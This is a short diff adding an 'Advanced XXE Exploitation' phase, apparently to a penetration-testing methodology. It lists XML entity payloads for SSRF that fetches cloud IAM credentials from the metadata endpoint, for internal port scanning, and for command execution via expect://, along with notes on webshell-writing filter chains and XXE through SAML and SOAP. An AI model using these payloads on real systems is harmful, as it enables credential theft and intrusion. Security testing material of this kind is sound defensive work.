@@ -1,0 +1,21 @@
+**Phase 4: Advanced XXE Exploitation**
+- **SSRF via XXE**:
+  ```xml
+  <!ENTITY xxe SYSTEM "http://169.254.169.254/latest/meta-data/iam/security-credentials/">
+  ```
+- **Port Scanning**:
+  ```xml
+  <!ENTITY xxe SYSTEM "http://10.0.0.1:80/">
+  ```
+- **RCE via expect://** (if PHP expect module loaded):
+  ```xml
+  <!ENTITY xxe SYSTEM "expect://id">
+  ```
+- **RCE via PHP Filter Chain** (PHP 8.1+):
+  - Complex filter chains to write webshell
+- **XXE via SAML**:
+  - Malicious SAML Response/Assertion with XXE
+  - Target SP metadata endpoints
+- **XXE via SOAP**:
+  - Inject in SOAP Body/Header
+  - Test with `Content-Type: text/xml`
